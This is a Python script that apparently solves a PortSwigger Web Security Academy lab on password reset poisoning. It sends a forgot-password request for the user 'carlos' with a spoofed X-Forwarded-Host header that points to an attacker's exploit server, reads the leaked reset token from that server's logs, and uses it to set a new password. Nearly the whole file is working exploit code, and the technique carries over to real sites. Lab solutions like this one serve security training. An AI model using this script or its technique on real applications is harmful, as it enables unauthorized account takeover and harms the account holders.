###########################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 30/8/2023
#
# Lab: Password reset poisoning via middleware
#
# Steps: 1. Change the dynamically-generating link of password change
#           functionality via X-Forwarded-Host header to point to your
#           exploit server
#        2. Extract the temporary token from you server logs
#        3. Use the token to change carlos password
#
###########################################################################

###########
# imports
###########
import requests
import re
from colorama import Fore
import base64

# change this url to your lab
url = "https://0aab0069035cc825816f4d04003e0030.web-security-academy.net"
# change this url to your exploit server
exploit_domain = "exploit-0a8600e50395c83781154ca90174008c.exploit-server.net"


#########################################################
# Function used to change the dynamically-generated link
#########################################################
def change_dynamically_generated_link(url, exploit_domain):
    data = {
        "username": "carlos"
    }
    headers = {
        "X-Forwarded-Host": exploit_domain
    }
    try:
        res = requests.post(f"{url}/forgot-password", data, headers=headers)
        if res.status_code == 200:
            print(
                Fore.WHITE + "1. Change the dynamically generated link via X-Forwarded-Host header.. ☑️")
            return True
        else:
            return False
    except:
        print(Fore.RED + "Failed to change the link through exception")


####################################################
#  Function used to issue a change password request
####################################################
def change_password(url, token, new_password):
    data = {
        "temp-forgot-password-token": token,
        "new-password-1": new_password,
        "new-password-2": new_password,
    }
    try:
        print(Fore.WHITE + "3. Changing the password of the carlos.. ☑️")
        return requests.post(f"{url}/forgot-password", data)
    except:
        print(Fore.RED + "Failed to change password through exception")


##################################################################
# Function used to extract the token from the exploit sever logs
##################################################################
def extract_token_from_logs(exploit_domain):
    try:
        res = requests.get(f"https://{exploit_domain}/log")
        if res.status_code == 200:
            token = re.findall(
                "temp-forgot-password-token=(.*) HTTP", res.text)
            if len(token) != 0:
                print(
                    Fore.WHITE + "2. Get temp-forgot-password-token of the carlos from exploit sever logs.. ☑️")
                return token[len(token)-1]
            else:
                return None
        else:
            print(Fore.RED + "Failed to extract the token from the logs")
    except:
        print(Fore.RED + "Failed to GET the /log from the server")


###############################
# Starting point of the script
###############################
is_changed = change_dynamically_generated_link(
    url, exploit_domain)  # try to change the link
if is_changed:  # if the link is changed successfully
    # try to extract the token from your server logs
    token = extract_token_from_logs(exploit_domain)
    if token != None:  # if you found the token
        new_password = "Hacked"  # change this to what you want
        password_changed = change_password(url, token, new_password)
        if password_changed.status_code == 200:
            print(Fore.YELLOW + "✅ Password changed to: " +
                  Fore.GREEN + new_password)
    else:
        print(Fore.RED + "No tokens are found is the logs")
else:
    print(Fore.RED + "Failed to change the link")
